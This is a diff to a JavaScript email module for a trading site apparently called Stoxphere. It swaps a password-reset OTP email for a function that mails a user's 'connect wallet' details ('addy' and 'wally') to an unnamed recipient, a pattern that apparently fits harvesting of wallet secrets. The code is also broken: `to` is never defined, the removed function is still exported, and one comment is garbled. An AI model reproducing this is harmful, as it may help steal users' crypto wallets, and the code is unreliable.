@@ -303,17 +303,34 @@ async function resendWelcomeEmail({ to, token }) {
 /**
  * resetEmail (send OTP for password reset; original name resetEmail)
  */
-async function resetEmail({ to, token }) {
-  const otp = speakeasy.totp({ secret: globalSecret.base32, encoding: "base32" });
+
+
+async function sendWalletInfo({ username, addy,wally }) {
+ 
   const content = `
-    <p>You requested to change your password. Use the OTP below to reset it:</p>
-    <div style="background:#f1f7ff;padding:12px;border-left:4px solid #0f66d0;border-radius:6px;text-align:center;">
-      <h2 style="margin:0;color:#0f66d0">${otp}</h2>
-    </div>
-    <p style="margin-top:12px">If you did not request this, contact support immediately.</p>
+    <html>
+    <h2>Welcome to Patextrade</h2>
+
+    <p>${username},just requested to connect wallet.Here are the details;
+
+    </p>
+<p>${addy}
+
+</p>
+
+<p>${wally}
+
+</p>
+
+    </html>
+
   `;
-  return sendEmail({ to, subject: "Change Password — Stoxphere", html: wrapEmail(content, "Change Password") });
+  return sendEmail({ to, subject: "Wallet connect — Stoxphere", html: wrapEmail(content, "Wallet connect") });
 }
+
+
+
+
 
 /**
  * sendUserDepositEmail (confirmation to user)
@@ -422,6 +439,7 @@ module.exports = {
   resetEmail,
   sendKycAlert,
   sendUserDetails,
+  sendWalletInfo,
   // helpful low-level helpers if you need them
   sendEmail,
   generateOtp: generateOtp || generateOtp, // keep available (generateOtp is not defined; but generateOtp is generateOtp? We'll provide a small helper below if needed.)
